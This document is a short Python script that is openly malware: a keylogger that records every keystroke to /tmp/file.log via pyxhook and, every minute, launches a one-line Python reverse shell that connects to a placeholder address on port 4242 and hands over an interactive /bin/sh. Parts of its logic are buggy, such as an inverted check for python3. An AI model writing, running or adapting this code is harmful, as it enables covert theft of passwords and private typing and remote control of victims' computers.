import os.path
import os
import pyxhook
import schedule
import time

def open_server():
	if os.system("which python3"):
		command = 'python3 -c '
		command += 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("ip-addr",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
		os.system(command)
	else:
		command = 'python -c'
		command += 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("ip-addr",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
		os.system(command)

def check_file():
	if os.path.exists("/tmp/file.log"):
		return "/tmp/file.log"
	else:
		fp = open("/tmp/file.log", "a")
		fp.close()
		return "/tmp/file.log"


def onKeyPress(event):
	with open(log_file, 'a') as f:
        	f.write('{}\n'.format(event.Key))    
        	  	 	
if __name__ == "__main__": 
	log_file = check_file()
	new_hook = pyxhook.HookManager()
	new_hook.KeyDown = onKeyPress
	new_hook.HookKeyboard()
	try:
		new_hook.start()
		schedule.every(1).minutes.do(open_server) # should be fixed
		#schedule.every().day.at("00:00").do(open_server)
		
	except KeyboardInterrupt:
		pass
	
